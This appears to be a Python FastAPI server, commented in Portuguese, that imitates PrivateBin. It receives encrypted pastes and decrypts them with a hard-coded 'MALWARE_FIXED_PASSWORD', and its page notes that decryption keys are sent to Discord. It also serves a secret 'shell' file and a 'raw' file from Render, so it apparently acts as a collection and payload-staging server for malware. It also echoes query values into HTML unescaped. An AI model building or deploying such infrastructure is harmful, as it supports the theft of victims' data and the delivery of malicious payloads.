
from fastapi import FastAPI, HTTPException, Query
from fastapi.responses import HTMLResponse, JSONResponse, PlainTextResponse
import json
import os
import uuid
from urllib.parse import unquote_plus
import base64
import zlib
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
from typing import Dict, Any, Optional, List
from pydantic import BaseModel

# --- Configuração da API ---
app = FastAPI(
    title="Mock PrivateBin API",
    description="Simulação de um servidor PrivateBin para receber e visualizar pastes (não persistente).",
    version="1.0.3" # Incrementada a versão
)

# --- Armazenamento em Memória (Não Persistente) ---
PASTES: Dict[str, Dict[str, Any]] = {}
DELETE_TOKENS: Dict[str, str] = {}

MALWARE_FIXED_PASSWORD = "7IvaKi$yAVb0"

RAW_FILE_PATH = os.path.join(os.path.dirname(__file__), "raw")
SHELL_FILE_PATH = os.environ.get("SHELL_FILE_PATH", os.path.join(os.path.dirname(__file__), "shell"))

# --- Funções de Criptografia (para a API PrivateBin) ---
# (Suas funções base58_decode e server_side_decrypt permanecem as mesmas)
def base58_decode(b58_string_encoded: bytes) -> bytes:
    alphabet = b'123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
    alphabet_len = len(alphabet)
    num = 0
    for char_val in b58_string_encoded:
        idx = alphabet.find(char_val)
        if idx == -1: raise ValueError(f"Invalid character in Base58 string: {bytes([char_val]).decode(errors='ignore')}")
        num = num * alphabet_len + idx
    byte_array = bytearray()
    temp_num = num
    if temp_num == 0 and len(b58_string_encoded) > 0: byte_array.insert(0, 0)
    while temp_num > 0:
        byte_array.insert(0, temp_num % 256)
        temp_num //= 256
    leading_zeros = 0
    for char_val in b58_string_encoded:
        if char_val == alphabet[0]: leading_zeros += 1
        else: break
    return bytes([0] * leading_zeros) + bytes(byte_array)

def server_side_decrypt(paste_passphrase_b58_str, fixed_password_str,
                        paste_adata_obj, paste_ciphertext_b64_str):
    try:
        passphrase_bytes = base58_decode(paste_passphrase_b58_str.encode('ascii'))
        paste_adata_json_str = json.dumps(paste_adata_obj, separators=(',', ':'))
        ciphertext = base64.b64decode(paste_ciphertext_b64_str)
        cipher_iv_b64, kdf_salt_b64, kdf_iterations, kdf_keysize, _, _, _, compression_type = paste_adata_obj[0]
        cipher_iv = base64.b64decode(cipher_iv_b64)
        kdf_salt = base64.b64decode(kdf_salt_b64)
        combined_passphrase = passphrase_bytes
        if fixed_password_str:
            combined_passphrase += bytes(fixed_password_str, 'utf-8')
        backend = default_backend()
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),
                         length=int(kdf_keysize / 8),
                         salt=kdf_salt,
                         iterations=kdf_iterations,
                         backend=backend)
        kdf_key = kdf.derive(combined_passphrase)
        aesgcm = AESGCM(kdf_key)
        decrypted_blob = aesgcm.decrypt(cipher_iv, ciphertext, paste_adata_json_str.encode('utf-8'))
        if compression_type == "zlib":
            decompressobj = zlib.decompressobj(wbits=-zlib.MAX_WBITS)
            paste_json_bytes = decompressobj.decompress(decrypted_blob) + decompressobj.flush()
        else:
            paste_json_bytes = decrypted_blob
        return paste_json_bytes
    except Exception as e_decrypt:
        print(f"Erro na descriptografia no servidor (API): {e_decrypt}")
        return None

# --- Modelos Pydantic ---
class PasteMeta(BaseModel):
    expire: str

class PastePayload(BaseModel):
    v: int
    adata: List[Any]
    ct: str
    meta: PasteMeta

# --- Endpoints da API ---

@app.post("/", response_model=Dict[str, Any])
async def create_paste(payload: PastePayload):
    paste_id = str(uuid.uuid4())
    delete_token = str(uuid.uuid4().hex)
    PASTES[paste_id] = {
        "adata": payload.adata,
        "ct": payload.ct,
        "meta": payload.meta.dict()
    }
    DELETE_TOKENS[paste_id] = delete_token
    print(f"\n--- Novo Paste Criptografado Recebido (API) ---")
    print(f"  ID do Paste: {paste_id}")
    return {
        "status": 0,
        "id": paste_id,
        "url": f"/?pasteid={paste_id}",
        "deletetoken": delete_token
    }

@app.get("/", response_class=HTMLResponse)
async def view_paste_or_list(
    pasteid: Optional[str] = Query(None, alias="pasteid"),
    b58key: Optional[str] = Query(None, alias="b58key")
):
    b58key_unquoted = unquote_plus(b58key) if b58key else None

    if pasteid:
        paste_data_saved = PASTES.get(pasteid)
        if not paste_data_saved:
            return HTMLResponse(content=f"<html><body><h1>404 - Paste Não Encontrado</h1><p>ID: '{pasteid}'</p></body></html>", status_code=404)

        adata_obj = paste_data_saved.get('adata')
        ct_b64_str = paste_data_saved.get('ct')
        decrypted_output_html = "<p><em>Insira a chave Base58 para tentar a descriptografia.</em></p>"

        if b58key_unquoted and adata_obj and ct_b64_str:
            print(f"Tentando descriptografar (API) paste {pasteid} com chave: {b58key_unquoted[:10]}...")
            decrypted_content_bytes = server_side_decrypt(
                b58key_unquoted, MALWARE_FIXED_PASSWORD, adata_obj, ct_b64_str
            )
            if decrypted_content_bytes:
                try:
                    final_data_dict = json.loads(decrypted_content_bytes.decode('utf-8'))
                    decrypted_output_html = "<h2>Conteúdo Descriptografado:</h2>"
                    decrypted_output_html += f"<pre>{json.dumps(final_data_dict, indent=2, ensure_ascii=False)}</pre>"
                    if 'attachment' in final_data_dict and final_data_dict.get('attachment_name'):
                        decrypted_output_html += f"<h3>Anexo Encontrado: {final_data_dict['attachment_name']}</h3>"
                except json.JSONDecodeError:
                    decrypted_output_html = "<h2>Conteúdo Descriptografado (Não JSON):</h2>"
                    decrypted_output_html += f"<pre>{decrypted_content_bytes.decode('utf-8', errors='ignore')}</pre>"
                print(f"Descriptografia bem-sucedida (API) para {pasteid}.")
            else:
                decrypted_output_html = "<p style='color:red;'>Falha ao descriptografar com a chave fornecida.</p>"
                print(f"Falha na descriptografia (API) para {pasteid} com a chave fornecida.")

        html_content_for_paste = f"""
        <html><head><title>Paste: {pasteid}</title><meta charset="UTF-8">
        <style> body {{ font-family: sans-serif; margin: 20px; }} pre {{ background-color: #f0f0f0; padding: 10px; border: 1px solid #ccc; white-space: pre-wrap; word-wrap: break-word; }} input[type="text"] {{ width: 80%; padding: 8px; margin-bottom: 10px; }} input[type="submit"] {{ padding: 10px 15px; cursor: pointer; }}</style>
        </head><body>
        <h1>Paste ID: <code>{pasteid}</code></h1>
        <p>A URL completa com a chave de descriptografia (fragmento #) foi enviada para o Discord.</p>
        <form method="GET" action="/">
            <label for="b58key_input">Insira a Chave Base58 (do fragmento # da URL):</label><br>
            <input type="text" id="b58key_input" name="b58key" value="{b58key_unquoted if b58key_unquoted else ''}"><br>
            <input type="hidden" name="pasteid" value="{pasteid}">
            <input type="submit" value="Tentar Descriptografar">
        </form><hr>{decrypted_output_html}<hr>
        <h2>Dados Criptografados Salvos (Referência):</h2>
        <h3>Metadados (<code>adata</code>):</h3><pre>{json.dumps(adata_obj, indent=2, ensure_ascii=False)}</pre>
        <h3>Ciphertext (<code>ct</code> - Base64):</h3><pre>{ct_b64_str}</pre>
        <p><a href="/">Voltar para a lista de pastes</a></p>
        </body></html>
        """
        return HTMLResponse(content=html_content_for_paste)

    else: # Mostrar página principal com lista de pastes
        list_body = "<html><head><title>Mock PrivateBin API (FastAPI)</title>"
        list_body += "<style>body {font-family: sans-serif;} li a {text-decoration: none;} li a:hover {text-decoration: underline;}</style></head>"
        list_body += "<body><h1>Mock PrivateBin API (FastAPI)</h1>"
        list_body += "<h3>Pastes Recebidos (em memória):</h3><ul>"
        if PASTES:
            for pid_list_item in sorted(PASTES.keys(), reverse=True):
                list_body += f"<li><a href='/?pasteid={pid_list_item}'>{pid_list_item}</a></li>"
        else:
            list_body += "<li>Nenhum paste recebido ainda.</li>"
        list_body += "</ul>"
        list_body += "<h3>Outros Links:</h3><ul>"
        list_body += "<li><a href='/raw'>Ver Código do Arquivo 'raw'</a></li>"
        list_body += "<li><a href='/shell'>Ver Código do Arquivo 'shell'</a></li>"  # Novo link adicionado
        list_body += "<li><a href='/ping'>Ping API</a></li>"
        list_body += "</ul></body></html>"
        return HTMLResponse(content=list_body)


@app.delete("/", response_model=Dict[str, Any])
async def delete_paste_api(pasteid: str = Query(...), deletetoken: str = Query(...)):
    print(f"\n--- Tentativa de DELETE (API) ---")
    print(f"  Paste ID para deletar: {pasteid}")
    print(f"  Token fornecido: {deletetoken}")

    correct_token = DELETE_TOKENS.get(pasteid)
    deleted_flag = False
    message_response = ""
    status_code_response = 500

    if correct_token and correct_token == deletetoken:
        if pasteid in PASTES:
            del PASTES[pasteid]
            deleted_flag = True
        del DELETE_TOKENS[pasteid]

        if deleted_flag:
            message_response = f"Paste {pasteid} deletado da memória."
            status_code_response = 200
            print(f"  {message_response}")
        else:
            message_response = f"Token para paste {pasteid} removido, mas o paste não estava na memória."
            status_code_response = 200
            print(f"  {message_response}")
    else:
        message_response = "Erro: Token de exclusão inválido ou paste ID não encontrado."
        status_code_response = 401
        print(f"  Falha no DELETE (API): {message_response}")

    if status_code_response != 200:
        raise HTTPException(status_code=status_code_response, detail=message_response)

    return {"status": 0, "message": message_response}


@app.get("/raw", response_class=PlainTextResponse)
async def get_raw_file_content():
    """
    Serve o conteúdo do arquivo 'raw' como texto plano.
    """
    try:
        with open(RAW_FILE_PATH, "r", encoding="utf-8") as f:
            content = f.read()
        return PlainTextResponse(content=content, media_type="text/plain; charset=utf-8")
    except FileNotFoundError:
        print(f"ERRO: Arquivo 'raw' não encontrado em: {RAW_FILE_PATH}")
        raise HTTPException(status_code=404, detail=f"Arquivo 'raw' não encontrado no servidor. Verifique o caminho: {RAW_FILE_PATH}")
    except Exception as e:
        print(f"ERRO ao ler o arquivo 'raw': {e}")
        raise HTTPException(status_code=500, detail="Erro interno ao tentar ler o arquivo 'raw'.")


@app.get("/shell", response_class=PlainTextResponse)
async def get_shell_file_content():
    """
    Serve o conteúdo do arquivo secreto 'shell' como texto plano.
    Este arquivo está armazenado como um secret file no Render.
    """
    try:
        with open(SHELL_FILE_PATH, "r", encoding="utf-8") as f:
            content = f.read()
        return PlainTextResponse(content=content, media_type="text/plain; charset=utf-8")
    except FileNotFoundError:
        print(f"ERRO: Arquivo 'shell' não encontrado em: {SHELL_FILE_PATH}")
        raise HTTPException(status_code=404, detail=f"Arquivo secreto 'shell' não encontrado no servidor. Verifique se o secret file foi configurado corretamente no Render.")
    except Exception as e:
        print(f"ERRO ao ler o arquivo 'shell': {e}")
        raise HTTPException(status_code=500, detail="Erro interno ao tentar ler o arquivo secreto 'shell'.")


@app.get("/ping", response_model=Dict[str, str])
async def ping():
    """
    Endpoint simples para verificar se a API está rodando.
    """
    return {"message": "pong"}


if __name__ == '__main__':
    import uvicorn
    print(f"Tentando servir arquivo 'raw' de: {os.path.abspath(RAW_FILE_PATH)}")
    if not os.path.exists(RAW_FILE_PATH):
        print(f"AVISO: O arquivo '{RAW_FILE_PATH}' não existe localmente. A rota /raw falhará.")
    print(f"Tentando servir arquivo 'shell' de: {os.path.abspath(SHELL_FILE_PATH)}")
    if not os.path.exists(SHELL_FILE_PATH):
        print(f"AVISO: O arquivo secreto 'shell' não existe localmente. A rota /shell falhará.")
    uvicorn.run(app, host="0.0.0.0", port=8000)
